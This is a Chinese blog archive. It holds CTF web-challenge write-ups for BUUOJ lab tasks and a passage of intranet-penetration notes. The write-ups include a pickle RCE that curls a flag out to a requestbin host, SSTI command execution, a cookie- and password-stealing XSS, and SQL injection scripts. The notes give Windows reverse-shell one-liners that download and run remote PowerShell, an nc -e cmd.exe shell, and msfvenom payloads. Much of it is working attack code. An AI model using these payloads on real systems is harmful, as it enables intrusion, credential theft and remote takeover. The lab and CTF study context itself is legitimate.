POST 请求，from 参数中含有危险内容（如 HTML 标签<code>&lt;xxx</code>）会被拦截，但是对于相同变量的 query 参数只会在首次访问<code>Request.QueryString</code>抛出异常</p><p>同样的，对于 GET 请求，query 参数中含有危险内容（如 HTML 标签<code>&lt;xxx</code>）会被拦截，但是对于相同变量的 form 参数只会在首次访问<code>Request.Form</code>抛出异常</p><p>所以这里我们利用 GET 请求，提交一个含有 HTML 标签的数据就可以绕过第一个目录遍历的异常处理，第二步就可以读取任意文件了</p><p>payload</p><pre><code>GET / HTTP/1.1...filename=../../flag.txt&amp;kk=&lt;a</code></pre><h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>在 Linux 中 /proc/self/ 指向当前目录，然后 SECRET_KEY 被收藏在 environ，所以访问 /proc/self/environ 就能得到访问到 SECRET_KEY</p><pre><code>SECRET_KEY=ACjzCrqQuX1nn6tmtmF80jQchsFJiUtq0sLdFDcH </code></pre><p>之后就可以伪造 cookie 了</p><pre><code># python .\flask_session_cookie_manager3.py encode -s &quot;ACjzCrqQuX1nn6tmtmF80jQchsFJiUtq0sLdFDcH&quot; -t &quot;&#123;&#39;balance&#39;:1999,&#39;purchases&#39;:[&#39;Linden honey&#39;]&#125;&quot;eyJiYWxhbmNlIjoxOTk5LCJwdXJjaGFzZXMiOlsiTGluZGVuIGhvbmV5Il19.Xmot1Q.lcjSJIrZDRkwyyF8xIYU3Sa9yKo</code></pre><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>文件包含，参数必须包含 woofers 或者 meowers</p><p>可用过滤器绕过</p><pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag</code></pre><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>无法进行时序攻击，所以只能绕过正则读 flag，但是不能以 config.php 结尾，但是<code>basename</code>可以用特殊字符扰乱规则绕过，但是试了好几个都不行，那就遍历一下</p><p>payload</p><pre><code>import requestsfor i in range(500):        url = &quot;http://15c46786-5a10-4bf1-869f-15dadc8b743f.node3.buuoj.cn/index.php/config.php/%&#123;&#125;?source&quot;.format(hex(i)[2:].zfill(2))        r = requests.get(url)        print(i)        if &#39;flag&#39; in r.text:                print(url)                print(r.text)                break</code></pre><h2 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h2><p>逻辑题目</p><p>访问<code>/api</code>可以得到一个 SecretState 这个是当前余额的一个哈希码</p><p>访问<code>/api/deal</code>可以进行赌博，但是只要我们的 state 不会变，我们的余额就不会变，当我们的应答包含 BlackJack 的时候，我们的余额会增加，然后我们就可以获取它的 SerectState 进行下一次赌博，这样就可以一直赢了</p><p>payload</p><pre><code>import requestsurl = &#39;http://62fdfbb0-31ff-409c-91fe-b3b1ded86d9a.node3.buuoj.cn/&#39;state = requests.post(url+&#39;api&#39;).json()[&#39;SecretState&#39;]while True:    print(&quot;try&quot;)    res = requests.post(url+&#39;api/deal&#39;, json = &#123;&#39;Bet&#39;: 500, &#39;SecretState&#39;: state&#125;).json()    if res[&#39;GameState&#39;] == &#39;Blackjack&#39;:        print(res)        state = res[&#39;SecretState&#39;]    if &#39;Flag&#39; in res:        print(res[&#39;Flag&#39;])        break</code></pre><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>flask-session-cookies 解密是 pickle 形式，应该考察的是 pickle 反序列化</p><p>直接贴 payload</p><blockquote><p>一开始一直不成功，后来发现是系统问题，一定要在 Linux 环境下运行！</p></blockquote><pre><code>import _pickle as cPickleimport sysimport base64import requestsCOMMAND = &quot;curl http://http.requestbin.buuoj.cn/18g6bpi1/`cat flag.txt|base64`&quot;class PickleRce(object):    def __reduce__(self):        import os        return (os.system,(COMMAND,))cookies = base64.b64encode(cPickle.dumps(PickleRce())).decode()print(cookies)cookies = &#123;&quot;session&quot;:cookies&#125;response = requests.get(&quot;http://02fb1191-450e-4699-b981-9b4922ae948d.node3.buuoj.cn/&quot;, cookies=cookies)print(response.text)</code></pre><h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>随缘试一下报错注入</p><pre><code>http://7a65e348-5074-45ed-b289-b4808c188a68.node3.buuoj.cn/?search=1 and (extractvalue(1,concat(0x7e,(select uniqueid from users limit 1),0x7e)));</code></pre><p>直接提交即可</p><p><code>http://7a65e348-5074-45ed-b289-b4808c188a68.node3.buuoj.cn/?search=837461526918364526</code></p><h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>SSTI 直接打过去（python3）</p><pre><code>http://e430c2d8-e92e-467c-871b-c432eff885ea.node3.buuoj.cn/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>上传文件没什么用，因为这是个 flask，把 session 抓下来看看是什么</p><pre><code># python .\flask_session_cookie_manager3.py decode -c eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoia2trayJ9.ppXwYZguivTJVIyddZBLSxS9C3ptkUon1PIGjmxPEKwb&#39;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&#39;</code></pre><p>提示是 jwt，那拿去解码一下</p><p><img src="https://i.loli.net/2020/05/26/4kF3hcy1jWCdJKb.png" alt="image-20200313210246245"></p><p>封装的是用户名，回去用 admin 注册一下发现已存在用户，所以应该是伪造 admin，但是没有密钥…</p><p>robots.txt 有惊喜，得到了 key</p><p> <code>you-will-never-guess</code></p><p>伪造得到<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.g_lGU4qTO2VhNrZK9k460xz828GcqKBayZPcmLmhUqE</code></p><p>替换进入页面发现 flag，加个 view-source 就看到了</p><p><img src="https://i.loli.net/2020/05/26/NhtKWTqBAGELuC8.png" alt="image-20200313210558800"></p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>题目提示过于明显，直接凭感觉对着用户名注册登陆一把嗦</p><p>不必写脚本了，bp 按两下就好了</p><p>查表</p><pre><code>&#39; union select group_concat(table_name) from information_schema.tables where table_schema=database()#FLAG_TABLE,news,users</code></pre><p>查列</p><pre><code>&#39; union select group_concat(column_name) from information_schema.columns where table_schema=database()#FLAG_COLUMN,id,title,content,time,id,username,password,info</code></pre><p>但是数据库里面没有 flag，应该是另外一种操作，看看其他表，没东西，但是提示确实是在数据库，应该是个幌子</p><p>试了一下写不了 shell，根目录也没默认 flag，这里卡了一个晚上…</p><p>第二天登上去，诡异的事情发生了… flag 连上表名和列名都变了？？？</p><p><img src="https://i.loli.net/2020/05/26/wIlEVUDefhocipz.png" alt="image-20200314110159110"></p><p>最后，emmm</p><pre><code>&#39; union select flag from flag#flag&#123;729c33d0-8f58-4bf6-9e77-c42c786ffefa&#125;</code></pre><p>这里有一说一，我真不知道为什么</p><h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>有反馈页面，那就是 XSS，查看源码，只要以 admin 登陆就能看到 flag</p><p>看看 CSP，只支持同源，支持内联标签</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;unsafe-inline&#39; &#39;self&#39;</code></pre><p>看看黑名单，过滤了很多关键字和编码，查看过滤逻辑，只要在关键字中间插入黑名单靠后的关键字就可以绕过，所以我们可以通过插入 cookie 绕过</p><p>看到了 login.js 的代码</p><pre><code>if (document.cookie &amp;&amp; document.cookie != &#39;&#39;) &#123;    var cookies = document.cookie.split(&#39;; &#39;);    var cookie = &#123;&#125;;    for (var i = 0; i &lt; cookies.length; i++) &#123;        var arr = cookies[i].split(&#39;=&#39;);        var key = arr[0];        cookie[key] = arr[1];    &#125;    if(typeof(cookie[&#39;user&#39;]) != &quot;undefined&quot; &amp;&amp; typeof(cookie[&#39;psw&#39;]) != &quot;undefined&quot;)&#123;        document.getElementsByName(&quot;username&quot;)[0].value = cookie[&#39;user&#39;];        document.getElementsByName(&quot;password&quot;)[0].value = cookie[&#39;psw&#39;];    &#125;&#125;</code></pre><p>如果用户正在登陆，就会把用户名和密码填充到表单里面</p><p>所以我们可以构造一个登陆页面，提交给 bot 让他自己填就好了</p><p>payload</p><pre><code>&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt;    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/18g6bpi1/?psw=&quot;+psw;&lt;/scrcookieipt&gt;</code></pre><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>投稿 + 反馈，显然是个 XSS</p><p>简单 fuzz 一下，过滤了很多标签和符号，但是 &amp;# 没有被过滤，所以我们可以用 unicode 编码绕过，在下面找了一个可以用的 payload</p><blockquote><p><a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> xss过滤的测试方法.html</p></blockquote><p><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code></p><p>但是又因为过滤了 = ，所以就用 eval 反弹，记得域名要用 web 代替</p><pre><code class="python">payload = &quot;(function()&#123;window.location.href=&#39;http://xss.buuoj.cn/index.php?do=api&amp;id=EP3Yq3&amp;location=&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation=&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;cookie=&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)())+&#39;&amp;opener=&#39;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return&#39;&#39;&#125;&#125;)());&#125;)();&quot;uc_payload = &#39;&#39;for i in payload:    uc_payload += &#39;&amp;#&#123;&#125;&#39;.format(ord(i))payload = &#39;&lt;svg&gt;&lt;script&gt;eval&#39; + uc_payload + &#39;&lt;/script&gt;&#39;print(payload)</code></pre><p>然后绕过 md5 就可以了，给出我自己用的两个脚本</p><pre><code class="python"># gen_md5.pyimport json, sys, hashlibdef getMD5(count=5, Salt=&#39;&#39;):    f = open(&#39;md5-&#123;&#125;.json&#39;.format(count),&#39;w&#39;)    MD5 = &#123;&#125;    for x in range(1000000, 9999999):        captcha = str(x)+ Salt        MD5[hashlib.md5(captcha).hexdigest()[:int(count)]] = x     json.dump(MD5, f)    f.close()if __name__ == &#39;__main__&#39;:    if len(sys.argv) == 2:        getMD5(sys.argv[1])    elif len(sys.argv)==3:        getMD5(sys.argv[1],sys.argv[2])    else:        getMD5()</code></pre><pre><code class="python"># find_md5.pyimport sys, jsonif len(sys.argv) == 3:    try:        f = open(&quot;md5-&#123;&#125;.json&quot;.format(sys.argv[1]),&#39;r&#39;)        MD5 = json.load(f)        print(MD5[sys.argv[2]])        f.close()    except Exception as e:        print(&quot;no key&quot;)</code></pre><p><img src="https://i.loli.net/2020/05/26/ozCMt8RKuWI36TX.png" alt="image-20200314152227158"></p><p>替换 session 扫描后台发现 admin.php，点进去就是一个 sqli</p><p>测了一下没什么过滤，就直接 sqlmap 一把梭吧</p><pre><code>python .\sqlmap.py -cookie=&quot;PHPSESSID=312a8283a4e7aaa5894ef9018c52e05e&quot; -u http://5f6fb99e-e122-4707-b88d-f896487c7f64.node3.buuoj.cn/admin.php?id=1 -D ciscn -T flag --dump</code></pre><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>一进去是个登陆界面，随便改个 register.php 得到注册页面，登陆进去只有用户名显示，显然是个二次注入，注册用户名为<code>1&#39;or&#39;1</code>，用户名显示为<code>1</code>但是试了一下 <code>union select</code> 无法注册，想了想逻辑应该是直接把邮箱、用户名和密码拼进去，然后根据邮箱查询把用户名带出来</p><p>所以这里我们可以直接拼字符串，学到了一个新姿势，就是二次 hex</p><pre><code>&#39;+select(hex(hex(payload)))+&#39;</code></pre><p>二次 hex 的原因是 一次 hex 后结果带有字母，变成字符串后不会带出来</p><p>二次 hex 最多只能取三个字母，不然会变成科学计数法</p><p>但是过滤了 information_schema ，只能盲猜一个 flag 了</p><p>还过滤了逗号，所有用 <code>substr xxx from x for x</code></p><p>payload</p><pre><code class="python">import requestsimport randomimport reimport binasciiflag = &#39;&#39;for offset in range(30):    email = &quot;kk&#123;&#125;@test.com&quot;.format(random.randint(1,10000000))    # payload = &quot;&#39;+(select hex(hex(database())))+&#39;&quot;    payload = &quot;&#39;+(select (hex(hex(substr((select * from flag) from &#123;&#125; for 3)))))+&#39;&quot;.format(1+3*offset)    # print(&quot;[Email] &#123;&#125;&quot;.format(email))    print(&quot;[Username] &#123;&#125;&quot;.format(payload))    paramsPost = &#123;&quot;password&quot;:&quot;kk&quot;,&quot;email&quot;:email,&quot;username&quot;:payload&#125;    r1 = requests.post(&quot;http://a5e38411-27dd-44db-aaa2-76ee10062321.node3.buuoj.cn/register.php&quot;, data=paramsPost)    # print(r1.text)    try:        paramsPost = &#123;&quot;password&quot;:&quot;kk&quot;,&quot;email&quot;:email&#125;        r2 = requests.post(&quot;http://a5e38411-27dd-44db-aaa2-76ee10062321.node3.buuoj.cn/login.php&quot;, data=paramsPost)        # print(r2.text)        results = re.findall(r&quot;&lt;span class=\&quot;user-name\&quot;&gt;\n(.*)&lt;/span&gt;&quot;, r2.text)[0].strip()        results = binascii.a2b_hex(binascii.a2b_hex(results)).decode()        print(&quot;[Results] &#123;&#125;&quot;.format(results))        if results == &#39;0&#39;:            break        flag += results    except Exception as e:        print(e)        break        # print(&quot;[Results] nothing!&quot;)print(&quot;[Flag] &#123;&#125;&quot;.format(flag))</code></pre><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>右键源码</p><p>首先全部都加了 addslashes 过滤，网站用的是 utf-8 编码，不能宽字节绕过</p><pre><code class="php">function filter($value)&#123;    !is_string($value) AND die(&quot;Hacking attempt!&quot;);    return addslashes($value);&#125;</code></pre><p>注册用户名做了如下过滤，非常严格</p><pre><code class="php">(preg_match(&#39;/(a|d|m|i|n)/&#39;, strtolower($_POST[&#39;username&#39;])) OR strlen($_POST[&#39;username&#39;]) &lt; 6 OR strlen($_POST[&#39;username&#39;]) &gt; 10 OR !ctype_alnum($_POST[&#39;username&#39;])) AND $con-&gt;close() AND die(&quot;Not allowed!&quot;);</code></pre><p>登陆用户名几乎没做过滤，那先面就是绕过<code>isset($_SESSION)了</code> ，这里利用到了之前 session 反序列化的知识了</p><p>session.upload_progress.enabled 为 On</p><pre><code>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</code></pre><p>所以发送一个请求包就可以绕过进行 sqli 了</p><pre><code>POST /templates/login.php HTTP/1.1Host: 0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Referer: http://0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cn/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=12269a1e808109b9d86291543e02cdd0Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryzALlheETContent-Length: 145------WebKitFormBoundaryzALlheETContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;tyaoo------WebKitFormBoundaryzALlheET</code></pre><p>下面的就是盲注了，直接上脚本，注意要使用 files 参数，不然无法文件形式传数据</p><pre><code class="python"># coding:utf-8from multiprocessing import Pool, Managerimport requestsimport binasciiimport urllib.parseimport time# ptbctf# flag_tbl# secretdef func(index, results):    l = 0    r = 127    m = (l+r)//2    while l&lt;r:        time.sleep(0.2)        url = &#39;http://0c730185-fd2e-4260-aec3-70bb4cfc37d5.node3.buuoj.cn/templates/login.php&#39;        payload = &quot;\&quot; or if((ascii(mid((select secret from flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;),1,0)-- -&quot;.format(index+1, m)        paramsGet = &#123;&quot;password&quot;:&quot;tyaoo&quot;,&quot;username&quot;:payload&#125;        paramsPost = &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;tyaoo&quot;&#125;        cookies = &#123;&quot;PHPSESSID&quot;:&quot;12269a1e808109b9d86291543e02cdd0&quot;&#125;        files = &#123;&quot;file&quot;: &quot;123456789&quot;&#125;        res = requests.post(url,files=files, data=paramsPost, params=paramsGet, cookies=cookies)        if &quot;again&quot; in res.text:            r = m            m = (l+r)//2        else:            l = m + 1            m = (l+r)//2    print(index+1, m)    results[index] = mif __name__ == &quot;__main__&quot;:    num = 5    data_num = 50    data = range(data_num)    pool = Pool(processes=num)    manager = Manager()    results = manager.list([0]*data_num)    jobs = []    for d in data:        job = pool.apply_async(func, (d, results))        jobs.append(job)    pool.close()    pool.join()    print(results)    results = &#39;&#39;.join([chr(_) for _ in results])    print(results)</code></pre><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>改了一堆 http 头</p><pre><code class="http">PUT /hurdles/!?get=flag&amp;%26%3d%26%3d%26=%25%30%30%0a HTTP/1.1Host: node3.buuoj.cn:27815Authorization: Basic cGxheWVyOjU0ZWYzNmVjNzEyMDFmZGY5ZDE0MjNmZDI2Zjk3ZjZiUser-Agent: 1337(v.9001)Accept: text/plainAccept-Language: ruCookie: Fortune=6265X-Forwarded-For: 13.37.13.37,127.0.0.1Origin: https://ctf.bsidessf.netReferer: https://ctf.bsidessf.net/challenges</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD上传图床小工具</title>
      <link href="/2020/05/26/MD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2020/05/26/MD%E4%B8%8A%E4%BC%A0%E5%9B%BE%E5%BA%8A%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>简单地整了一个 MarkDown 本地图片一键上传 SM.MS 的小工具</p><span id="more"></span><pre><code>https://github.com/Tyaoo/SMMS</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透——Kerberos篇</title>
      <link href="/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87/"/>
      <url>/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>对内网渗透一些东西的小记录</p><span id="more"></span><h2 id="WinXP配置PowerShell"><a href="#WinXP配置PowerShell" class="headerlink" title="WinXP配置PowerShell"></a>WinXP配置PowerShell</h2><ol><li><p>安装.NET Framework 2.0 Service Pack 2</p><p><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=1639</a></p></li><li><p>安装WindowsXP-KB926140-v5-x86-CHS.exe</p><p><a href="https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html">https://download.cnet.com/Microsoft-Windows-PowerShell-1-0-for-Windows-XP/3000-2070_4-75450849.html</a></p></li></ol><h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><pre><code class="cmd"># Attackernc -vlp 9999# Victimnc.exe 192.168.255.128 9999 -e c:\WINDOWS\system32\cmd.exe</code></pre><h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h3><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a> </p><pre><code class="cmd"># Attackernc -lvp 6666 或 powercat -l -p 6666# Victimpowershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.255.128 -p 6666 -e cmd</code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p><h3 id="Reverse-TCP-Shell"><a href="#Reverse-TCP-Shell" class="headerlink" title="Reverse TCP Shell"></a>Reverse TCP Shell</h3><pre><code class="cmd"># Attackernc -lvp 6666# Victimpowershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666或powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.255.128 -port 6666</code></pre><h3 id="Reverse-UDP-Shell"><a href="#Reverse-UDP-Shell" class="headerlink" title="Reverse UDP Shell"></a>Reverse UDP Shell</h3><pre><code class="cmd"># Attackernc -lvup 53# Victimpowershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#39;);Invoke-PowerShellUdp -Reverse -IPAddress 192.168.255.128 -port 53</code></pre><h3 id="Reverse-ICMP-shell"><a href="#Reverse-ICMP-shell" class="headerlink" title="Reverse ICMP shell"></a>Reverse ICMP shell</h3><p>icmpsh_m.py：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><pre><code class="cmd"># Attackersysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包python icmpsh_m.py 192.168.255.128 192.168.255.130 #开启监听# Victimpowershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.255.128/nishang/Shells/Invoke-PowerShellIcmp.ps1&#39;);Invoke-PowerShellIcmp -IPAddress 192.168.255.130</code></pre><h3 id="自定义payload"><a href="#自定义payload" class="headerlink" title="自定义payload"></a>自定义payload</h3><pre><code class="cmd"># Attackernc -lvp 6666# Victimpowershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;192.168.255.128&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</code></pre><h3 id="Reverse-DNS-Shell"><a href="#Reverse-DNS-Shell" class="headerlink" title="Reverse DNS Shell"></a>Reverse DNS Shell</h3><p>dnscat2：<a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> </p><pre><code class="cmd"># Attackerruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.255.128&quot; --no-cache -e open# Victimpowershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.255.128</code></pre><h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>PowerSploit：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><pre><code class="cmd"># Attackermsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.255.128 lport=6667 -f dll -o /var/www/html/PowerSploit/lltest.dll# VictimGet-Process #选择要注入的进程 IdIEX (New-Object Net.WebClient).DownloadString(&quot;http://192.168.255.128/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)Invoke-DllInjection -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</code></pre><h3 id="MSF-Reverse-Shell"><a href="#MSF-Reverse-Shell" class="headerlink" title="MSF Reverse Shell"></a>MSF Reverse Shell</h3><pre><code class="cmd"># Attackermsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.128 LPORT=4444 -f exe -o tcpshell.exe# Victimtcpshell.exe</code></pre><h2 id="信息收集（简）"><a href="#信息收集（简）" class="headerlink" title="信息收集（简）"></a>信息收集（简）</h2><pre><code class="cmd">ipconfig /all    # 查询本机IP段，所在域等net config Workstation    # 当前计算机名，全名，用户名，系统版本，工作站域，登陆域net user    # 本机用户列表net localgroup administrators    # 本机管理员[通常含有域用户]net user /domain    # 查询域用户net user 用户名 /domain    # 获取指定用户的账户信息net user /domain b404 pass    # 修改域内用户密码，需要管理员权限net group /domain    # 查询域里面的工作组net group 组名 /domain    # 查询域中的某工作组net group &quot;domain admins&quot; /domain    # 查询域管理员列表net group &quot;domain controllers&quot; /domain    # 查看域控制器(如果有多台)net time /domain    # 判断主域，主域服务器都做时间服务器ipconfig /all    # 查询本机IP段，所在域等</code></pre><h2 id="Kereros-协议（简）"><a href="#Kereros-协议（简）" class="headerlink" title="Kereros 协议（简）"></a>Kereros 协议（简）</h2><ul><li>客户机将明文密码进行NTLM哈希，然后和时间戳一起加密（使用KRBTGT密码hash作为密钥），发送给KDC（域控），KDC对用户进行检测，成功之后创建TGT（票据授权票据）</li><li>将TGT进行加密签名返回给客户机器，只有域用户KRBTGT才能读取Kerberos中TGT数据</li><li>然后客户机将TGT发送给KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li><li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li></ul><h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="Kerberoating"><a href="#Kerberoating" class="headerlink" title="Kerberoating"></a>Kerberoating</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令（无法用于远程连接）。</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol><li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li>请求TGS</li><li>导出TGS</li><li>暴力破解</li></ol><h4 id="手工导出"><a href="#手工导出" class="headerlink" title="手工导出"></a>手工导出</h4><ol><li><p>获取有价值的SPN</p><ol><li><p>使用powershell模块Active Directory</p><blockquote><p>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p><p>导入命令：</p><p>import-module .\Microsoft.ActiveDirectory.Management.dll</p><p>下载地址：</p><p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p></blockquote><pre><code class="cmd">import-module ActiveDirectoryget-aduser -filter 